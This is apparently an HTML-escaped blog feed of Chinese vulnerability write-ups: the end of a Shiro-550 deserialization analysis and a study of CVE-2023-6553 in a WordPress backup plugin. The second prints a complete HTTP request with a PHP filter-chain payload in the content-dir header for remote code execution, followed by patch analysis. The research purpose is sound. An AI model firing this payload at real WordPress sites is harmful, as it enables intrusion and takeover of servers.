&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (serialized &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;argument cannot be null.&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> IllegalArgumentException(msg);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ByteArrayInputStream bais &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ByteArrayInputStream(serialized);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> BufferedInputStream bis &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> BufferedInputStream(bais);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ObjectInputStream ois &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ClassResolvingObjectInputStream(bis);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> T deserialized &lt;span style="color:#f92672">=&lt;/span> ois.&lt;span style="color:#a6e22e">readObject&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ois.&lt;span style="color:#a6e22e">close&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> deserialized;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">catch&lt;/span> (Exception var6) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Unable to deserialze argument byte array.&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> SerializationException(msg, var6);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>会尝试调用ObjectInputStream.readObject方法，而ClassResolvingObjectInputStream类重写了resolveClass方法，因此会调用重写的resolveClass方法&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">protected&lt;/span> Class&lt;span style="color:#f92672">&amp;lt;?&amp;gt;&lt;/span> resolveClass(ObjectStreamClass osc) &lt;span style="color:#66d9ef">throws&lt;/span> IOException, ClassNotFoundException {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> ClassUtils.&lt;span style="color:#a6e22e">forName&lt;/span>(osc.&lt;span style="color:#a6e22e">getName&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">catch&lt;/span> (UnknownClassException var3) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ClassNotFoundException(&lt;span style="color:#e6db74">&amp;#34;Unable to load ObjectStreamClass [&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> osc &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;]: &amp;#34;&lt;/span>, var3);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> Class &lt;span style="color:#a6e22e">forName&lt;/span>(String fqcn) &lt;span style="color:#66d9ef">throws&lt;/span> UnknownClassException {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Class clazz &lt;span style="color:#f92672">=&lt;/span> THREAD_CL_ACCESSOR.&lt;span style="color:#a6e22e">loadClass&lt;/span>(fqcn);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (clazz &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (log.&lt;span style="color:#a6e22e">isTraceEnabled&lt;/span>()) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> log.&lt;span style="color:#a6e22e">trace&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Unable to load class named [&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> fqcn &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;] from the thread context ClassLoader. Trying the current ClassLoader...&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> clazz &lt;span style="color:#f92672">=&lt;/span> CLASS_CL_ACCESSOR.&lt;span style="color:#a6e22e">loadClass&lt;/span>(fqcn);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (clazz &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (log.&lt;span style="color:#a6e22e">isTraceEnabled&lt;/span>()) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> log.&lt;span style="color:#a6e22e">trace&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Unable to load class named [&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> fqcn &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;] from the current ClassLoader. &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Trying the system/application ClassLoader...&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> clazz &lt;span style="color:#f92672">=&lt;/span> SYSTEM_CL_ACCESSOR.&lt;span style="color:#a6e22e">loadClass&lt;/span>(fqcn);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (clazz &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Unable to load class named [&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> fqcn &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;] from the thread context, current, or &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;system/application ClassLoaders. All heuristics have been exhausted. Class could not be found.&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> UnknownClassException(msg);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> clazz;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>跟进THREAD_CL_ACCESSOR.loadClass，在调试其中可以看到已经获取到TomcatEmbeddedWebAppClassLoader，并且将目标类java.util.PriorityQueue加载。&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2016-4437-shiro-550-RCE.zh-cn.assets/5.png" />&lt;/p>
&lt;p>而后尝试反序列化该类，该类重写了readObject方法，在该方法断点，调用栈如下&lt;/p>
&lt;pre tabindex="0">&lt;code>readObject:782, PriorityQueue (java.util)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
invokeReadObject:1058, ObjectStreamClass (java.io)
readSerialData:1909, ObjectInputStream (java.io)
readOrdinaryObject:1808, ObjectInputStream (java.io)
readObject0:1353, ObjectInputStream (java.io)
readObject:373, ObjectInputStream (java.io)
deserialize:77, DefaultSerializer (org.apache.shiro.io)
deserialize:514, AbstractRememberMeManager (org.apache.shiro.mgt)
convertBytesToPrincipals:431, AbstractRememberMeManager (org.apache.shiro.mgt)
getRememberedPrincipals:396, AbstractRememberMeManager (org.apache.shiro.mgt)
getRememberedIdentity:604, DefaultSecurityManager (org.apache.shiro.mgt)
resolvePrincipals:492, DefaultSecurityManager (org.apache.shiro.mgt)
&lt;/code>&lt;/pre>&lt;p>&lt;strong>代码执行&lt;/strong>&lt;/p>
&lt;p>通过传入
&lt;a href="https://www.ch35tnut.site/zh-cn/research/web/java-deserialization/commonsbeanutils1-chain/">CommonsBeanutils1 链&lt;/a>的序列化数据执行代码。&lt;/p>
&lt;p>PoC
&lt;a href="https://paste.ubuntu.com/p/T5DNQXYm7H/" target="_blank">https://paste.ubuntu.com/p/T5DNQXYm7H/&lt;/a>&lt;/p>
&lt;h3 id="小结">小结&lt;/h3>
&lt;p>由于代码中使用了固定的密钥，使得攻击者可以构造合法的加密数据，使得shiro反序列化攻击者的恶意数据，触发反序列化，通过CommonsBeanutils1反序列化链实现代码执行。&lt;/p>
&lt;p>&lt;strong>参考链接&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>
&lt;a href="http://www.luckysec.cn/posts/9db50098.html" target="_blank">http://www.luckysec.cn/posts/9db50098.html&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>Created at 2024-01-08T18:08:35+08:00&lt;/strong>&lt;/p></description></item><item><title>CVE 2023 6553 Wordpress Backup Migration Plugin RCE</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-6553-wordpress-backup-migration-plugin-rce/</link><pubDate>Fri, 29 Dec 2023 18:43:31 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-6553-wordpress-backup-migration-plugin-rce/</guid><description>&lt;h3 id="基本信息">基本信息&lt;/h3>
&lt;p>WordPress 的备份迁移插件的/includes/backup-heart.php 文件。这是由于攻击者能够控制传递给包含的值，并随后利用该值实现远程代码执行。&lt;/p>
&lt;h3 id="影响版本">影响版本&lt;/h3>
&lt;pre tabindex="0">&lt;code>Backup Migration &amp;lt;= 1.3.7
&lt;/code>&lt;/pre>&lt;h3 id="环境搭建">环境搭建&lt;/h3>
&lt;p>参考
&lt;a href="https://github.com/docker/awesome-compose/tree/master/official-documentation-samples/wordpress/" target="_blank">https://github.com/docker/awesome-compose/tree/master/official-documentation-samples/wordpress/&lt;/a>使用docker启动&lt;/p>
&lt;p>下载插件并启用
&lt;a href="https://downloads.wordpress.org/plugin/backup-backup.1.3.7.zip" target="_blank">https://downloads.wordpress.org/plugin/backup-backup.1.3.7.zip&lt;/a>&lt;/p>
&lt;h3 id="技术分析调试">技术分析&amp;amp;调试&lt;/h3>
&lt;p>查看
&lt;a href="https://plugins.trac.wordpress.org/changeset?old_path=%2Fbackup-backup%2Ftags%2F1.3.7%2Fincludes%2Fbackup-heart.php&amp;amp;old=3009260&amp;amp;new_path=%2Fbackup-backup%2Ftags%2F1.3.8%2Fincludes%2Fbackup-heart.php&amp;amp;new=3009260&amp;amp;sfp_email=&amp;amp;sfph_mail=" target="_blank">补丁&lt;/a>可知通过控制HTTP头，可以控制后面require_once的参数，即攻击者可以通过控制HTTP头控制require_once的参数。&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-6553-Wordpress-Backup-Migration-plugin-RCE.zh-cn.assets/1.png" />&lt;/p>
&lt;p>参考
&lt;a href="https://www.ch35tnut.site/zh-cn/research/web/php-filter-rce/">PHP filter 代码执行&lt;/a>&lt;/p>
&lt;p>poc地址&lt;code>https://github.com/synacktiv/php_filter_chain_generator&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /wp-content/plugins/backup-backup/includes/backup-heart.php &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">192.168.59.211&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User-Agent&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accept&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accept-Language&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">zh-CN,en-US;q=0.7,en;q=0.3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accept-Encoding&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">gzip, deflate&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Referer&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">http://192.168.59.211/wp-admin/&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Connection&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">close&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">wordpress_e9913da348dbccb312080f19f2d5f42e=admin%7C1702633600%7CBBAORunYr1sBsNJxoXPCZzDmitl6nf4o0pJSWDAC1y1%7Ca6e8acc150f152d2b5aa4d373e5ff828187efd0c9e212eab25859d55778a52e2; i_like_gitea=94b6fe5fe1049e19; lang=zh-CN; redirect_to=%2F; JSESSIONID=node019bmeisxrr5jql3o20jv87og13.node0; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_e9913da348dbccb312080f19f2d5f42e=admin%7C1702633600%7CBBAORunYr1sBsNJxoXPCZzDmitl6nf4o0pJSWDAC1y1%7Cb3a0f6ea3e6536b5e606de98a800e4156008295e564a757f1b36ed6a8077c9f7; wp-settings-time-1=1702463992&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Upgrade-Insecure-Requests&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>content-dir&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="小结">小结&lt;/h3>
&lt;p>虽然只能控制require后面的路径参数，由于PHP的动态性以及PHP filter的灵活性，攻击者可以通过PHP filter构造特殊的iconv 编码链让require获取到构造的恶意代码并执行。&lt;/p>
&lt;p>其利用各种编码的RFC规定的特性来预置字符，是这个漏洞中最有意思的地方。&lt;/p>
&lt;p>&lt;strong>补丁分析&lt;/strong>&lt;/p>
&lt;p>补丁中新增了&lt;code>filterChainFix&lt;/code>函数，过滤请求头中的&lt;code>ABSPATH&lt;/code>和&lt;code>BMI_ROOT_DIR&lt;/code>，这个函数通过过滤PHP、&lt;code>|&lt;/code>等并且严格限制参数长度来预防这个漏洞利用。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">31&lt;/span> &lt;span style="color:#75715e">// Filter and prevent PHP filter injection
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">filterChainFix&lt;/span>($content) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">33&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">34&lt;/span> &lt;span style="color:#75715e">// Make sure it exist and is string
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#ae81ff">35&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">is_string&lt;/span>($content)) &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Incorrect parameters.&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">36&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">37&lt;/span> &lt;span style="color:#75715e">// Check if it&amp;#39;s not larger than max allowed path length (default systems)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#ae81ff">38&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">strlen&lt;/span>($content) &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">256&lt;/span>) &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Incorrect parameters.&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">39&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">40&lt;/span> &lt;span style="color:#75715e">// Check if the path does not contain &amp;#34;php:&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#ae81ff">41&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">strpos&lt;/span>($content, &lt;span style="color:#e6db74">&amp;#34;php:&amp;#34;&lt;/span>)) &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Incorrect parameters.&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">42&lt;/span>
